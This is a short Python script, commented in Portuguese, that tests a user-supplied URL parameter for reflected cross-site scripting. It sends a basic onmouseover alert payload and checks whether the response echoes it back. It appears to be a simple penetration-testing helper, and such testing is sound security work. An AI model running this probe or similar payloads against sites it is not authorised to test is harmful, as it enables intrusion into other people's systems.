import requests

def test_xss(url, param, payload):
    # Monta a URL com o payload no parâmetro
    target_url = f"{url}?{param}={payload}"
    print(f"Testando: {target_url}")
    
    try:
        resp = requests.get(target_url, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Erro na requisição: {e}")
        return False

    # Verifica se o payload está refletido no conteúdo da resposta
    if payload in resp.text:
        print("[!] Possível vulnerabilidade XSS detectada!")
        return True
    else:
        print("[-] XSS não detectado.")
        return False

if __name__ == "__main__":
    # URL alvo (sem parâmetros)
    url = input("Digite a URL alvo (ex: https://example.com/search): ").strip()
    param = input("Digite o parâmetro para testar (ex: q): ").strip()
    
    # Payload básico para teste XSS
    payload = "<b onmouseover=alert('Wufff!')>click me!</b>"
    test_xss(url, param, payload)
